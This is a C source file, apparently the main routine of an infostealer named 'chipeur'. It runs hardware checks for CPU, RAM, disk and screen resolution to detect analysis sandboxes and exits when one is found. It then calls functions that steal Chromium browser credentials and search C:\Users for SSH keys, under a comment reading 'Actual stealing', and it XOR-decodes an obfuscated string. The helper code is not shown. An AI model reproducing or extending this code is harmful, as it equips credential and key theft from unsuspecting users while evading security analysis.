#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#include "chromium.h"
#include "find_ssh_key.h"
#include "hardware_requirements.h"
#include "obfuscation.h"

void hello(void) { printf("Hello World\n"); }

int main(void) {
  // Puts the console in UTF-8
  // Allows us to print non-ASCII characters for debug
  SetConsoleOutputCP(CP_UTF8);

  // Stop if sandbox detected
  int return_code = check_hardware();
  if (return_code != EXIT_SUCCESS) {
    fprintf(stderr, "Hardware requirements check failed. Reason: ");
    switch (return_code) {
      case EXIT_CPU_FAIL: fprintf(stderr, "CPU check failed.\n"); break;
      case EXIT_RAM_FAIL: fprintf(stderr, "RAM check failed.\n"); break;
      case EXIT_HDD_FAIL: fprintf(stderr, "HDD check failed.\n"); break;
      case EXIT_RESOLUTION_FAIL:
        fprintf(stderr, "Resolution check failed.\n");
        break;
      default: fprintf(stderr, "Unknown check failed.\n"); break;
    }
    fprintf(stderr, "Now exiting...");
    return EXIT_FAILURE;
  }

  // Actual stealing
  hello();
  steal_chromium_creds();
  find_ssh_key(L"C:\\Users");

  char str[] = "BOFFE";
  xor_str(str, strlen(str));
  printf("%s", str);

  return EXIT_SUCCESS;
}
